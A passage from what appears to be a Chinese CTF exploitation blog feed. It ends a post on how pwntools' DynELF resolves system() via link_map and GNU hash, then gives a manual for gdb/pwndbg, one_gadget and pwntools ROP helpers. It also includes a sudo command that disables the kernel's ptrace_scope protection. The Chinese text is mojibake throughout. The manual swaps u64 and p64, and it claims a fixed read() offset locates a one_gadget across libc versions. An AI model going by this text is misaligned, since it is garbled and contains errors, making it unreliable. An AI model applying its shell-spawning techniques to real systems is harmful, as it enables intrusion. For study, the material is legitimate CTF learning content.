src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-26_144448.png" alt=""></p><h2 id="è·å–libc-soå†…å­˜åŠ è½½åŸºåœ°å€"><a href="#è·å–libc-soå†…å­˜åŠ è½½åŸºåœ°å€" class="headerlink" title="è·å–libc.soå†…å­˜åŠ è½½åŸºåœ°å€"></a>è·å–libc.soå†…å­˜åŠ è½½åŸºåœ°å€</h2><p>elfæ˜¯åŠ¨æ€é“¾æ¥çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåœ¨è¯¥ç±»å‹æ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªlink_mapåŒå‘é“¾è¡¨ï¼Œå…¶ä¸­åŒ…å«äº†æ¯ä¸ªåŠ¨æ€åŠ è½½çš„åº“çš„è·¯å¾„å’ŒåŠ è½½åŸºå€ç­‰ä¿¡æ¯</p><p>å¯ä»¥é€šè¿‡ä¸¤ç§é€”å¾„è·å–link_mapé“¾è¡¨ï¼šä¸€æ˜¯åœ¨æ‰€æœ‰ELFæ–‡ä»¶ä¸­ï¼Œé€šè¿‡Dynamicæ®µDT_DEBUGåŒºåŸŸå¾—åˆ°ã€‚äºŒæ˜¯åœ¨non-RELRO ELFæ–‡ä»¶ä¸­ï¼Œlink_mapåœ°å€å­˜åœ¨äº.got.pltåŒºèŠ‚ä¸­ï¼Œè¯¥åŒºèŠ‚çš„åŠ è½½åœ°å€å¯ä»¥ä»DYNAMICæ®µDT_PLTGOTåŒºåŸŸå¾—åˆ°ã€‚</p><p>è¿™ä¸¤ç§é€”å¾„éƒ½éœ€è¦çŸ¥é“elfçš„DYNAMICæ®µåœ°å€ï¼šæˆ‘ä»¬åœ¨ç¬¬ä¸€æ­¥ä¸­è·å–äº†elfå†…å­˜åŠ è½½åŸºåœ°å€ï¼Œç”±æ­¤å¯ä»¥å¾—åˆ°elfæ®µè¡¨ï¼Œé€šè¿‡è§£æelfæ®µè¡¨å¯ä»¥å¾—åˆ°DYNAMICåŸºåœ°å€ã€‚</p><p>é€šè¿‡ç¬¬äºŒç§æ–¹å¼è·å–link_mapç»“æ„çš„ç¤ºæ„å›¾å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-26_144541.png" alt=""></p><h2 id="è·å–libc-soçš„hashè¡¨ã€åŠ¨æ€ç¬¦å·è¡¨ã€å­—ç¬¦ä¸²è¡¨åŸºåœ°å€"><a href="#è·å–libc-soçš„hashè¡¨ã€åŠ¨æ€ç¬¦å·è¡¨ã€å­—ç¬¦ä¸²è¡¨åŸºåœ°å€" class="headerlink" title="è·å–libc.soçš„hashè¡¨ã€åŠ¨æ€ç¬¦å·è¡¨ã€å­—ç¬¦ä¸²è¡¨åŸºåœ°å€"></a>è·å–libc.soçš„hashè¡¨ã€åŠ¨æ€ç¬¦å·è¡¨ã€å­—ç¬¦ä¸²è¡¨åŸºåœ°å€</h2><p>åœ¨æ‰€æœ‰éœ€è¦å¯¼å‡ºå‡½æ•°ç»™å…¶ä»–æ–‡ä»¶ä½¿ç”¨çš„ELFæ–‡ä»¶ï¼ˆä¾‹å¦‚: â€œlibc.soâ€ï¼‰ä¸­ï¼Œç”¨åŠ¨æ€ç¬¦å·è¡¨ã€å­—ç¬¦ä¸²è¡¨ã€hashè¡¨ç­‰ä¸€ç³»åˆ—è¡¨ç”¨äºæŒ‡ç¤ºå¯¼å‡ºç¬¦å·ï¼ˆä¾‹å¦‚:â€systemâ€ï¼‰çš„åç§°ã€åœ°å€ã€hashå€¼ç­‰ä¿¡æ¯ã€‚é€šè¿‡libc.soçš„Dynamicæ®µDT_GNU_HASHã€DT_SYMTABã€DT_STRTABå¯ä»¥è·å–hashè¡¨ã€åŠ¨æ€ç¬¦å·è¡¨ã€å­—ç¬¦ä¸²è¡¨åœ¨å†…å­˜ä¸­çš„åŸºåœ°å€ã€‚</p><h2 id="é€šè¿‡hashè¡¨è·å–systemå‡½æ•°åœ°å€"><a href="#é€šè¿‡hashè¡¨è·å–systemå‡½æ•°åœ°å€" class="headerlink" title="é€šè¿‡hashè¡¨è·å–systemå‡½æ•°åœ°å€"></a>é€šè¿‡hashè¡¨è·å–systemå‡½æ•°åœ°å€</h2><p>hashè¡¨æ˜¯ç”¨äºæŸ¥æ‰¾ç¬¦å·çš„æ•£åˆ—è¡¨ï¼Œé€šè¿‡libc.soçš„hashè¡¨å¯ä»¥æ‰¾åˆ°systemå‡½æ•°å†…å­˜åŠ è½½åœ°å€ï¼Œåœ¨ELFæ–‡ä»¶ä¸­æœ‰SYSVã€GNUä¸¤ç§ç±»å‹çš„hashè¡¨ï¼Œå…¶ä¸­é€šè¿‡GNU HASHæŸ¥æ‰¾systemå‡½æ•°åœ°å€ç¤ºæ„å›¾å¦‚ä¸‹ã€‚</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-26_144815.png" alt=""></p><p>å›¾ä¸­ï¼š nbucketsæ˜¯hash bucketsçš„æ•°å€¼ï¼Œsymndxæ˜¯hashè¡¨æ˜ å°„ç¬¦å·è¡¨çš„èµ·å§‹ç´¢å¼•ï¼ŒBloom Filterç”¨ä½œè¿‡æ»¤ä¸åœ¨ç¬¦å·è¡¨ä¸­çš„ç¬¦å·åç§°ï¼Œåœ¨DynELFä¸­å¹¶æ²¡æœ‰ä½¿ç”¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash=gnu_hash(â€œsystemâ€)ï¼Œgnu_hashæ˜¯GNU HASHç®—æ³•å‡½æ•°ndx=hash%nbucketsï¼Œndxæ˜¯ç¬¦å·è¡¨ä¸­æ‰€æœ‰ ç¬¦å·HASH%nubuckets ç›¸ç­‰çš„èµ·å§‹ç´¢å¼•</span><br></pre></td></tr></table></figure><p>æœ€åï¼šå†…å­˜æ³„éœ²å‡½æ•°åœ¨è¿‡ç¨‹ä¸­ç”¨ä½œè¯»å–ç¨‹åºå†…å­˜æ•°æ®ï¼Œåƒä¸Šé¢ä¾‹å­ä¸­è·å–link_mapã€DYNAMICæ®µã€elfæ®µè¡¨ç­‰å†…å®¹éƒ½æ˜¯é€šè¿‡å†…å­˜æ³„éœ²å‡½æ•°ã€‚</p>]]></content>
    
    
    <summary type="html">DynELF????</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="æŠ€å·§" scheme="https://ixout.github.io/tags/%E6%8A%80%E5%B7%A7/"/>
    
    <category term="DynELF" scheme="https://ixout.github.io/tags/DynELF/"/>
    
  </entry>
  
  <entry>
    <title>å·¥å…·ä½¿ç”¨æ‰‹å†Œ</title>
    <link href="https://ixout.github.io/posts/26682/"/>
    <id>https://ixout.github.io/posts/26682/</id>
    <published>2023-03-25T02:13:00.000Z</published>
    <updated>2023-03-26T02:30:56.110Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¨‹åº"><a href="#ç¨‹åº" class="headerlink" title="ç¨‹åº"></a>ç¨‹åº</h1><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><ul><li><p>[]è¡¨ç¤ºç›´æ¥è¾“å…¥</p></li><li><p>â€œâ€è¡¨ç¤ºéœ€ç”±å¼•å·åŒ…è£¹</p></li><li>{}è¡¨ç¤ºé”®ç›˜æ“ä½œ</li></ul><h3 id="åŸºæœ¬"><a href="#åŸºæœ¬" class="headerlink" title="åŸºæœ¬"></a>åŸºæœ¬</h3><ul><li><p><code>help [æŒ‡ä»¤]</code>æŸ¥çœ‹ä¸ªæŒ‡ä»¤çš„ç”¨æ³•</p></li><li><p><code>i</code>å³info  æŸ¥çœ‹ä¿¡æ¯</p><ul><li><code>i b</code>æŸ¥çœ‹æ–­ç‚¹</li><li><code>i r</code>æŸ¥çœ‹å¯„å­˜å™¨</li><li><code>i f</code>æŸ¥çœ‹å‡½æ•°å</li></ul></li><li><code>show</code>ä¸infoç±»ä¼¼,ä½†æ›´å¤šæ˜¯è°ƒè¯•ä¿¡æ¯</li><li><code>stack [æ•°]</code>æŸ¥çœ‹æ ˆ</li><li><code>backtrace</code>æŸ¥çœ‹æ ˆçš„å˜åŒ–</li><li><code>vmmap</code>å†…å­˜æ®µåŸºæœ¬ä¿¡æ¯</li></ul><h3 id="æ‰§è¡Œ"><a href="#æ‰§è¡Œ" class="headerlink" title="æ‰§è¡Œ"></a>æ‰§è¡Œ</h3><ul><li><p><code>start</code>å¼€å§‹æˆ–é‡æ–°å¼€å§‹</p></li><li><p><code>s [æ•°]</code>å•æ­¥æ­¥å…¥,æ•°æœ‰å¡«çš„è¯å°±æ˜¯æ‰§è¡Œå¤šå°‘æ­¥,æºç å±‚é¢</p><ul><li><code>si [æ•°]</code>åŒä¸Š,æ±‡ç¼–å±‚é¢</li></ul></li><li><code>n [æ•°]</code>å•æ­¥æ­¥è¿‡,æ•°æœ‰å¡«çš„è¯å°±æ˜¯æ‰§è¡Œå¤šå°‘æ­¥,æºç å±‚é¢<ul><li><code>ni [æ•°]</code>åŒä¸Š,æ±‡ç¼–å±‚é¢</li></ul></li><li><code>c</code>ç»§ç»­æ‰§è¡Œåˆ°æ–­ç‚¹ï¼Œæ²¡æ–­ç‚¹å°±ä¸€ç›´æ‰§è¡Œä¸‹å»</li><li><code>&#123;ctrl+c&#125;</code>ç¨‹åºè¾“å…¥æ—¶å¼ºè¡Œä¸­æ–­</li><li><code>r</code>é‡æ–°å¼€å§‹æ‰§è¡Œ</li></ul><h3 id="æ–­ç‚¹"><a href="#æ–­ç‚¹" class="headerlink" title="æ–­ç‚¹"></a>æ–­ç‚¹</h3><ul><li><code>b *[åœ°å€]</code><ul><li><code>b *$ rebase([ç›¸å¯¹åç§»])</code>å¼€å¯pieæ—¶å¯ç”¨</li></ul></li><li><code>b [å‡½æ•°å]</code></li><li><code>b [æ•°]</code>æºç ç¬¬å‡ è¡Œæ–­ç‚¹</li><li><code>b +[æ•°]</code>å½“å‰å¾€ä¸‹å¤šå°‘åœä½,åŒæ ·å¯ä»¥æœ‰-</li><li><code>delete [æ•°]</code>åˆ é™¤æ–­ç‚¹</li><li><code>disable [æ•°]</code>ç¦ç”¨æ–­ç‚¹</li><li><code>enable [æ•°]</code>å¯ç”¨æ–­ç‚¹</li><li><code>clear</code>æ¸…æ¥šä¸‹é¢æ‰€æœ‰æ–­ç‚¹</li><li><code>watch [åœ°å€]</code>åœ°å€æ•°æ®æ”¹å˜æ—¶åœä¸‹</li><li><code>watch [å˜é‡]</code>/å˜é‡æ”¹å˜çš„æ—¶å€™ä¼šæ–­</li><li><code>info watchpoints</code> æŸ¥çœ‹watchæ–­ç‚¹ä¿¡æ¯</li><li><code>catch syscall</code> syscallç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™æ–­ä½</li><li><code>tcatch syscall</code> syscallç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™æ–­ä½ï¼Œåªæ–­ä¸€æ¬¡</li><li><code>info break</code> catchçš„æ–­ç‚¹å¯ä»¥é€šè¿‡i bæŸ¥çœ‹</li></ul><h3 id="æŸ¥æ‰¾æ•°æ®"><a href="#æŸ¥æ‰¾æ•°æ®" class="headerlink" title="æŸ¥æ‰¾æ•°æ®"></a>æŸ¥æ‰¾æ•°æ®</h3><ol><li><code>search [å€¼(å¤šæ˜¯å­—é¢å€¼,å­—ç¬¦ä¸²ä¹‹ç±»)]</code></li><li><code>find &quot;å­—ç¬¦ä¸²&quot;</code>    pwndbgç‹¬æœ‰</li></ol><h3 id="æŸ¥çœ‹å†…å­˜"><a href="#æŸ¥çœ‹å†…å­˜" class="headerlink" title="æŸ¥çœ‹å†…å­˜"></a>æŸ¥çœ‹å†…å­˜</h3><ul><li><p><code>x /[nuf]</code></p><ul><li><p>nä»£è¡¨å‡ ä¸ªå•å…ƒ</p></li><li><p>uä»£è¡¨æ¯ä¸ªå•å…ƒå‡ ä¸ªå­—èŠ‚(<strong>bâ€”1</strong>|<strong>hâ€”2</strong>|<strong>wâ€”4</strong>|<strong>gâ€”8</strong>)</p></li><li><p>fä»£è¡¨æ˜¾ç¤ºæ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</span><br><span class="line">d æŒ‰åè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</span><br><span class="line">u æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºæ— ç¬¦å·æ•´å‹ã€‚</span><br><span class="line">o æŒ‰å…«è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</span><br><span class="line">t æŒ‰äºŒè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</span><br><span class="line">a æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</span><br><span class="line">c æŒ‰å­—ç¬¦æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</span><br><span class="line">f æŒ‰æµ®ç‚¹æ•°æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</span><br><span class="line">s æŒ‰å­—ç¬¦ä¸²æ˜¾ç¤ºã€‚</span><br><span class="line">b æŒ‰å­—ç¬¦æ˜¾ç¤ºã€‚</span><br><span class="line">i æ˜¾ç¤ºæ±‡ç¼–æŒ‡ä»¤</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="ä¿®æ”¹æ•°æ®"><a href="#ä¿®æ”¹æ•°æ®" class="headerlink" title="ä¿®æ”¹æ•°æ®"></a>ä¿®æ”¹æ•°æ®</h3><ul><li><code>set $[å¯„å­˜å™¨]=[å€¼]</code> æŠŠå¯„å­˜å™¨çš„å€¼å˜ä¸ºæ‰€æ›´æ”¹çš„</li><li><code>set *([åœ°å€])=[å€¼]</code> åœ°å€çš„å€¼æ›´æ”¹ï¼Œ<strong>æ³¨æ„å¸¦æ˜Ÿå·</strong></li><li><code>set args &quot;a1&quot; &quot;a2&quot; &quot;a3&quot;</code> ç»™å‚æ•°123èµ‹å€¼</li><li><code>set args &quot;python3 -c &#39;print &quot;1234\x7f\xde&quot;&#39;&quot;&#39;</code> ä½¿ç”¨pythonç»™å‚æ•°èµ‹å€¼ä¸å¯è§å­—ç¬¦</li></ul><h3 id="å †-pwndbg-ç‹¬æœ‰"><a href="#å †-pwndbg-ç‹¬æœ‰" class="headerlink" title="å †(pwndbg)ç‹¬æœ‰"></a>å †(pwndbg)ç‹¬æœ‰</h3><ul><li><p><code>arena</code> æ˜¾ç¤ºå½“å‰arenaçš„è¯¦ç»†ä¿¡æ¯</p><ul><li><code>arenas</code> æ˜¾ç¤ºæ‰€æœ‰arenaçš„åŸºæœ¬ä¿¡æ¯</li><li><code>arenainfo</code> <strong>å¥½çœ‹çš„æ˜¾ç¤º</strong>æ‰€æœ‰arenaçš„ä¿¡æ¯</li></ul></li><li><p><code>bins</code> </p><p>å¸¸ç”¨ï¼ŒæŸ¥çœ‹æ‰€æœ‰ç§ç±»çš„å †å—çš„é“¾è¡¨æƒ…å†µ</p><ul><li><code>fastbins</code> å•ç‹¬æŸ¥çœ‹fastbinsçš„é“¾è¡¨æƒ…å†µ</li><li><code>largebins</code> åŒä¸Šï¼Œå•ç‹¬æŸ¥çœ‹largebinsçš„é“¾è¡¨æƒ…å†µ</li><li><code>smallbins</code> åŒä¸Šï¼Œå•ç‹¬æŸ¥çœ‹smallbinsçš„é“¾è¡¨æƒ…å†µ</li><li><code>unsortedbin</code> åŒä¸Šï¼Œå•ç‹¬æŸ¥çœ‹unsortedbiné“¾è¡¨æƒ…å†µ</li><li><code>tcachebins</code> åŒä¸Šï¼Œå•ç‹¬æŸ¥çœ‹tcachebinsçš„é“¾è¡¨æƒ…å†µ</li><li><code>tcache</code> æŸ¥çœ‹tcacheè¯¦ç»†ä¿¡æ¯</li></ul></li><li><p><code>heap</code> </p><p>æ•°æ®ç»“æ„çš„å½¢å¼æ˜¾ç¤ºæ‰€æœ‰å †å—ï¼Œä¼šæ˜¾ç¤ºä¸€å¤§å †</p><ul><li><code>heapbase</code> <strong>æŸ¥çœ‹å †èµ·å§‹åœ°å€</strong></li><li><code>heapinfo</code>ã€<code>heapinfoall</code> æ˜¾ç¤ºå †å¾—ä¿¡æ¯ï¼Œå’Œbinsçš„æŒºåƒçš„ï¼Œ<strong>æ²¡binså¥½ç”¨</strong></li><li><code>parseheap</code> æ˜¾ç¤ºå †ç»“æ„ï¼Œ<strong>å¾ˆå¥½ç”¨</strong></li></ul></li><li><p><code>tracemalloc</code> <strong>å¥½ç”¨</strong>ï¼Œä¼šè·Ÿæç¤ºæ‰€æœ‰æ“ä½œå †çš„åœ°æ–¹</p></li></ul><h3 id="å…¶ä»–-ä¸€äº›æ˜¯pwndbgç‹¬æœ‰"><a href="#å…¶ä»–-ä¸€äº›æ˜¯pwndbgç‹¬æœ‰" class="headerlink" title="å…¶ä»–(ä¸€äº›æ˜¯pwndbgç‹¬æœ‰)"></a>å…¶ä»–(ä¸€äº›æ˜¯pwndbgç‹¬æœ‰)</h3><ul><li><code>cyclic [æ•°]</code> ç”Ÿæˆç”¨æ¥æº¢å‡ºçš„å­—ç¬¦<ul><li><code>cyclic -l [ åœ°å€]</code>æ­é…ä½¿ç”¨</li></ul></li><li><code>$reabse</code> //<strong>å¼€å¯PIEçš„æƒ…å†µçš„åœ°å€åç§»</strong><ul><li><code>b *$reabse(0x123456)</code> æ–­ä½PIEçŠ¶æ€ä¸‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­0x123456çš„åœ°æ–¹</li><li><code>codebase</code> æ‰“å°PIEåç§»ï¼Œ<strong>ä¸rebaseä¸åŒï¼Œè¿™æ˜¯æ‰“å°ï¼Œrebaseæ˜¯ä½¿ç”¨</strong></li></ul></li><li><code>retaddr</code> æ‰“å°åŒ…å«è¿”å›åœ°å€çš„æ ˆåœ°å€</li><li><code>canary</code> ç›´æ¥çœ‹canaryçš„å€¼</li><li><code>plt</code> æŸ¥çœ‹pltè¡¨</li><li><code>got</code> æŸ¥çœ‹gotè¡¨</li><li><code>hexdump [åœ°å€] [æ•°]</code> åƒIDAé‚£æ ·æ˜¾ç¤ºæ•°æ®ï¼Œ<strong>å¸¦å­—ç¬¦ä¸²</strong></li></ul><h3 id="å–„ç”¨help-å‘½ä»¤"><a href="#å–„ç”¨help-å‘½ä»¤" class="headerlink" title="å–„ç”¨help [å‘½ä»¤]"></a>å–„ç”¨help [å‘½ä»¤]</h3><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p>one_gadgetæ˜¯libcä¸­å­˜åœ¨çš„ä¸€äº›æ‰§è¡Œ<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>çš„ç‰‡æ®µï¼Œå½“å¯ä»¥æ³„éœ²libcåœ°å€ï¼Œå¹¶ä¸”å¯ä»¥çŸ¥é“libcç‰ˆæœ¬çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨æ­¤æ–¹æ³•æ¥å¿«é€Ÿæ§åˆ¶æŒ‡ä»¤å¯„å­˜å™¨å¼€å¯shellã€‚</p><p>ç›¸æ¯”äº<code>system(&quot;/bin/sh&quot;)</code>ï¼Œè¿™ç§æ–¹å¼æ›´åŠ æ–¹ä¾¿ï¼Œä¸ç”¨æ§åˆ¶RDIã€RSIã€RDXç­‰å‚æ•°ã€‚è¿ç”¨äºä¸åˆ©æ„é€ å‚æ•°çš„æƒ…å†µã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget &lt;FILE|-b BuildID&gt; [options]</span><br></pre></td></tr></table></figure><ol><li>å¦‚æœæ˜¯ä½¿ç”¨_malloc_hookæ¥è°ƒç”¨one_gadgetï¼Œé‚£ä¹ˆéœ€è¦é…åˆreallocæ¥æ„é€ æ‰€éœ€å‚æ•°ï¼Œreallocåœ¨libcä¸­çš„ç¬¦å·æ˜¯__libc_realloc</li><li>å¦‚æœæ˜¯ä½¿ç”¨å…¶ä»–æ–¹å¼è°ƒç”¨one_gadgetï¼Œæ¯”å¦‚è¯´ä¿®æ”¹GOTè¡¨ï¼Œé‚£ä¹ˆéœ€è¦åœ¨æ ˆä¸Šæå‰æ„é€ å¥½å‚æ•°ï¼Œæˆ–è€…å°†raxå¯„å­˜å™¨æ¸…é›¶</li><li>åœ¨æ³„éœ²libcåœ°å€çš„æ—¶å€™ï¼Œ<strong>æœ€å¥½æ˜¯æ³„éœ²readå‡½æ•°çš„åœ°å€</strong>ï¼Œå› ä¸º<strong>readå‡½æ•°è·ç¦»one_gadgetçš„åç§»æ˜¯å›ºå®šçš„</strong>ï¼Œåªéœ€è¦å°†readå‡½æ•°çœŸå®åœ°å€<strong>å‡å»0x6109</strong>ï¼Œè¿™ä¹ˆåšçš„å¥½å¤„æ˜¯ä¸ç”¨çŸ¥é“libcçš„ç‰ˆæœ¬ï¼Œ</li></ol><h1 id="pythonåŒ…"><a href="#pythonåŒ…" class="headerlink" title="pythonåŒ…"></a>pythonåŒ…</h1><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><h3 id="æ•°æ®æ¥æ”¶ä¸å‘é€"><a href="#æ•°æ®æ¥æ”¶ä¸å‘é€" class="headerlink" title="æ•°æ®æ¥æ”¶ä¸å‘é€"></a>æ•°æ®æ¥æ”¶ä¸å‘é€</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sh.recv(numb = 2048, timeout = dufault)  æ¥å—æ•°æ®ï¼ŒnumbæŒ‡å®šæ¥æ”¶çš„å­—èŠ‚ï¼ŒtimeoutæŒ‡å®šè¶…æ—¶</span><br><span class="line">sh.recvline(keepends=True)  æ¥å—ä¸€è¡Œæ•°æ®ï¼Œkeependsä¸ºæ˜¯å¦ä¿ç•™è¡Œå°¾çš„\n</span><br><span class="line">sh.recvuntil(b&quot;Hello,World\n&quot;,drop=fasle)  æ¥å—æ•°æ®ç›´åˆ°è®¾ç½®çš„æ ‡å¿—å‡ºç°ï¼Œdropè¡¨ç¤ºæ˜¯å¦æ¥æ”¶æ ‡å¿—ï¼Œé»˜è®¤æ¥æ”¶</span><br><span class="line">sh.recvall()  ä¸€ç›´æ¥æ”¶ç›´åˆ°EOF</span><br><span class="line">sh.recvrepeat(timeout = default)  æŒç»­æ¥å—ç›´åˆ°EOFæˆ–timeout</span><br><span class="line">sh.interactive()  ç›´æ¥è¿›è¡Œäº¤äº’ï¼Œç›¸å½“äºå›åˆ°shellçš„æ¨¡å¼ï¼Œåœ¨å–å¾—shellä¹‹åä½¿ç”¨</span><br><span class="line">send(data) - å‘é€æ•°æ®</span><br><span class="line">sendline(line) - å‘é€æ•°æ®åŠ ä¸€ä¸ªæ¢è¡Œ</span><br><span class="line">u64()/u32()  æ‰“åŒ…</span><br><span class="line">p64()/p32()  è§£åŒ…</span><br></pre></td></tr></table></figure><p>è¡¥å……ä¸€ä¸‹ä¸pythonå­—ç¬¦ä¸²åˆ‡ç‰‡çš„è”åˆä½¿ç”¨</p><p>pythonå­—ç¬¦ä¸²ä¸‹æ ‡ä¹Ÿæ˜¯ä»0å¼€å§‹,str[a:b]æ˜¯å·¦å–å³ä¸å–,å³å¦‚[1:5]è¡¨ç¤ºç¬¬2ä¸ªåˆ°ç¬¬5ä¸ªå­—ç¬¦,è´Ÿæ•°è¡¨ç¤ºå€’æ•°ç¬¬å‡ ä¸ª,ä¾‹å¦‚[-6:]è¡¨ç¤ºä»å€’æ•°ç¬¬6ä¸ªåˆ°ç»“æŸ,å·¦è¾¹ä¸ºç©ºä»£è¡¨ä»å¤´å¼€å§‹,å³è¾¹ä¸ºç©ºä»£è¡¨åˆ°ç»“æŸä¸ºæ­¢</p><p>ä»¥åŠ<strong>å·¦å¯¹é½ljust</strong>,<strong>å³å¯¹é½rjust</strong></p><h3 id="é’ˆå¯¹elfçš„å¤„ç†"><a href="#é’ˆå¯¹elfçš„å¤„ç†" class="headerlink" title="é’ˆå¯¹elfçš„å¤„ç†"></a>é’ˆå¯¹elfçš„å¤„ç†</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">symbols[&#x27;a_function&#x27;] æ‰¾åˆ° a_function çš„åœ°å€</span><br><span class="line">##libc.symbols[&#x27;read&#x27;]</span><br><span class="line">got[&#x27;a_function&#x27;] æ‰¾åˆ° a_functionçš„ got</span><br><span class="line">##elf.got[&quot;read&quot;]</span><br><span class="line">plt[&#x27;a_function&#x27;] æ‰¾åˆ° a_function çš„ plt</span><br><span class="line">##elf.plt[&quot;read&quot;]</span><br><span class="line">next(e.search(&quot;some_characters&quot;)) æ‰¾åˆ°åŒ…å« some_charactersï¼ˆå­—ç¬¦ä¸²ï¼Œæ±‡ç¼–ä»£ç æˆ–è€…æŸä¸ªæ•°å€¼ï¼‰çš„åœ°å€</span><br><span class="line">##libc.next(e.search(&quot;/bin/sh&quot;))</span><br></pre></td></tr></table></figure><h3 id="contextåŠlog"><a href="#contextåŠlog" class="headerlink" title="contextåŠlog"></a>contextåŠlog</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br></pre></td></tr></table></figure><h3 id="ä¸gdbè”åˆ"><a href="#ä¸gdbè”åˆ" class="headerlink" title="ä¸gdbè”åˆ"></a>ä¸gdbè”åˆ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach()</span><br><span class="line">Linux ç³»ç»Ÿæœ‰ä¸€ä¸ªå«åštrace_scopeçš„è®¾ç½®ï¼Œå®ƒå¯ä»¥é˜»æ­¢éå­è¿›ç¨‹çš„è¿›ç¨‹è¢«è°ƒè¯•ã€‚Pwntools å¯¹äºå®ƒè‡ªå·±å¯åŠ¨çš„ä»»ä½•è¿›ç¨‹éƒ½èƒ½è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯å¦‚æœä½ å¿…é¡»åœ¨ Pwntools ä¹‹å¤–å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹ï¼Œå¹¶è¯•å›¾é€šè¿‡ pid é™„åŠ åˆ°å®ƒï¼ˆä¾‹å¦‚gdb.attach(1)ï¼‰ï¼Œå¯èƒ½è¢«é˜»æ­¢é™„åŠ ã€‚</span><br><span class="line"></span><br><span class="line">å¯ä»¥é€šè¿‡ç¦ç”¨å®‰å…¨è®¾ç½®å’Œé‡å¯æœºå™¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼š</span><br><span class="line"></span><br><span class="line">sudo tee /etc/sysctl.d/10-ptrace.conf &lt;&lt;EOF</span><br><span class="line">kernel.yama.ptrace_scope = 0</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="ROPé“¾"><a href="#ROPé“¾" class="headerlink" title="ROPé“¾"></a>ROPé“¾</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rop=ROP(&#x27;&#x27;)  åˆ›å»ºä¸€ä¸ªropå¯¹è±¡</span><br><span class="line">rop.raw()   å¡«å……padding</span><br><span class="line">rop.call(&#x27;å‡½æ•°&#x27;,[arg1,arg2,arg3])  è°ƒç”¨å‡½æ•°</span><br><span class="line">#å¯¹ä¸€äº›å¸¸è§å‡½æ•°ä¹Ÿå¯ä»¥ç›´æ¥</span><br><span class="line">#rop.read(arg1,arg2,arg3)</span><br><span class="line">#rop.write(arg1,arg2,arg3)</span><br><span class="line">rop.unresolve(&#x27;&#x27;) è¿”å›ç¬¦å·çš„åœ°å€</span><br><span class="line">rop.chain()  è¿”å›å®Œæ•´çš„ropé“¾</span><br><span class="line">rop.migrate(base_stage) å°†ç¨‹åºæµç¨‹è½¬ç§»åˆ° base_stageï¼ˆåœ°å€ï¼‰,æ ˆè¿ç§»?</span><br><span class="line">rop.dump() ç›´è§‚åœ°å±•ç¤ºå½“å‰çš„ rop é“¾</span><br></pre></td></tr></table></figure><h3 id="pwntoolsé™„å¸¦çš„ä¸€äº›åŠŸèƒ½"><a 